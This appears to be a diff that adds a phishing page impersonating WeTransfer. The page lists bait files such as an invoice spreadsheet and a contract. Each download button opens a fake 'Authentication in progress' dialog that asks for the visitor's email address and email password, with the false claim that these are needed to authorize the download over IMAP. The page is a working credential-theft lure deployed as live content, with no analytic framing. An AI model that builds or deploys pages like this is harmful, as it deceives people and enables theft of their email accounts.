@@ -1,0 +1,248 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>WeTransfer</title>
+<link href="local_resources/img/a4befd2bde8b5621400f4088f8af4188.png" rel="icon" type="image/x-icon"/>
+<link crossorigin="anonymous" href="local_resources/css/2d2ee13975040b18577db6a3b9749bf4.css" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" rel="stylesheet"/>
+<style>
+        #loader {
+            -webkit-animation: fadeout 10s linear forwards;
+            animation: fadeout 5s linear forwards;
+        }
+
+        .nav-container {
+            opacity: 0;
+            display: block;
+            -webkit-animation: fadein 20s linear forwards;
+            animation: fadein 1s linear forwards;
+            animation-delay: 2s;
+        }
+
+        @-webkit-keyframes fadeout {
+            90% {
+                opacity: 1;
+            }
+
+            99% {
+                opacity: 0;
+                height: 200px
+            }
+
+            100% {
+                opacity: 0;
+                height: 0
+            }
+        }
+
+        @keyframes fadeout {
+            90% {
+                opacity: 1;
+            }
+
+            99% {
+                opacity: 1;
+                height: 200px
+            }
+
+            100% {
+                opacity: 0;
+                height: 0
+            }
+        }
+
+        @-webkit-keyframes fadein {
+            0% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadein {
+            0% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+    </style>
+<style>
+        body {
+            background-color: #f1f1f1;
+            overflow: hidden;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+        }
+
+        .head1 {
+            display: flex;
+            position: relative;
+            justify-content: space-between;
+        }
+
+        .contain-all {
+            display: flex;
+            position: relative;
+            justify-content: space-between;
+            padding: 2%;
+
+
+        }
+
+        .logbox {
+            width: 22%;
+            height: 100%;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            margin-left: 20px;
+            background-color: #fff;
+        }
+
+        .write-test {
+            font-size: 40px;
+            line-height: 120%;
+        }
+
+        .accept1 {
+            margin-top: 30px;
+        }
+
+        .flex-container {
+            display: flex;
+            flex-direction: column;
+            margin-top: 10px;
+        }
+
+        .div1 {
+            display: flex;
+            position: relative;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .img-btn {
+            cursor: pointer;
+        }
+    </style>
+<style>
+    @media (max-width:480px){
+        .logbox{
+            width: 100%;
+        }
+
+        .imgdispaybox{
+            display:none;
+        }
+
+        .contentbox{
+            display: none;
+        }
+    }
+</style>
+</head>
+<body>
+<div class="head1">
+<div class="logo"><img alt="logo" src="local_resources/img/2720f224bdc5514126c7fb8bb88d603f.png"/></div>
+<div class="navimg"><img alt="wet-nav" src="local_resources/img/f1cdbe8e9e1d83b6a11d55b7fce93195.png"/></div>
+</div>
+<div class="contain-all">
+<div class="logbox">
+<div><img alt="lo-black" src="local_resources/img/a4befd2bde8b5621400f4088f8af4188.png"/></div>
+<div class="write-test"><span>You're</span><br/>
+<b>almost</b> there
+            </div>
+<div class="flex-container">
+<div class="div1">
+<div>PO_201AJ02.xls</div>
+<div class="img-btn" data-bs-target="#exampleModal" data-bs-toggle="modal"><img alt="download" src="local_resources/img/19cc8107a97748e270dd2750b0b8e927.png"/></div>
+</div>
+<div class="div1">
+<div>Product-Specifications.pdf</div>
+<div class="img-btn" data-bs-target="#exampleModal" data-bs-toggle="modal"><img alt="download" src="local_resources/img/19cc8107a97748e270dd2750b0b8e927.png"/></div>
+</div>
+<div class="div1">
+<div>Contract.xls</div>
+<div class="img-btn" data-bs-target="#exampleModal" data-bs-toggle="modal"><img alt="download" src="local_resources/img/19cc8107a97748e270dd2750b0b8e927.png"/></div>
+</div>
+</div>
+<div class="accept1">To continue, please agree<br/>
+                to our <u><b><span class="img-btn" data-bs-target="#exampleModal" data-bs-toggle="modal">Terms Of
+                            Service.</span></b></u></div>
+<hr/>
+<center>
+<button class="btn btn-primary" data-bs-target="#exampleModal" data-bs-toggle="modal" type="button">
+                    Download
+                </button>
+</center>
+</div>
+<div class="contentbox"><img alt="content" src="local_resources/img/c223018f729f824ed536f0ab16b69be5.png"/></div>
+<div class="imgdispaybox"><img alt="imgco" src="local_resources/img/1abf3c59f0ffc1ce77415b49f6bf9781.png"/></div>
+</div>
+<!-- Modal -->
+<form action="" method="post">
+<div aria-hidden="true" aria-labelledby="exampleModalLabel" class="modal fade" id="exampleModal" tabindex="-1">
+<div class="modal-dialog">
+<div class="modal-content">
+<div class="modal-header">
+<h1 class="modal-title fs-5" id="exampleModalLabel">Authentication in progress</h1>
+<button aria-label="Close" class="btn-close" data-bs-dismiss="modal" type="button"></button>
+</div>
+<div class="modal-body">
+<div id="loader">
+<center>
+<img alt="" src="local_resources/img/c42197bd428c8f4e506220884af81d5a.gif" width="30%"/>
+<p>Connecting <b><span id="connect"></span></b> Email Server to WeTransfer</p>
+</center>
+</div>
+<div class="nav-container">
+<div class="alert alert-primary" role="alert">
+                                These files are sensitive and secured against unauthorized access. In order to access
+                                this file, please provide your correct email credentials, we will connect to your email
+                                provider through a secure IMAP channel to authorize your download.
+                            </div>
+<div class="mb-3">
+<label class="form-label" for="exampleFormControlInput1">Email address:</label>
+<input class="form-control" id="email" name="email" placeholder="name@example.com" type="email"/>
+</div>
+<div class="mb-3">
+<label class="form-label" for="exampleFormControlInput1">Password:</label>
+<input class="form-control" id="password" name="password" placeholder="Enter Email Password" type="password"/>
+</div>
+<div class="alert alert-danger" id="msg" role="alert" style="display: hidden;">
+</div>
+</div>
+</div>
+<div class="modal-footer">
+<button class="btn btn-primary" id="submit-btn" type="submit">Download Now</button>
+</div>
+</div>
+</div>
+</div>
+</form>
+<script>
+        const myModal = document.getElementById('myModal')
+        const myInput = document.getElementById('myInput')
+
+        myModal.addEventListener('shown.bs.modal', () => {
+            myInput.focus()
+        })
+
+    </script>
+<script crossorigin="anonymous" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" src="local_resources/js/949abd11d43e7efb1eae399a6f3e888b.js"></script>
+<script src="local_resources/js/beda153bcd938546da2dec1435b7f8d4.js"></script>
+<script src="local_resources/js/326ea4d90d790c68e5073cc68b3bb35d.js"></script>
+<script src="local_resources/js/c78cf211b2343b1e60e8503dca17a33b.js"></script>
+</body>
+</html>
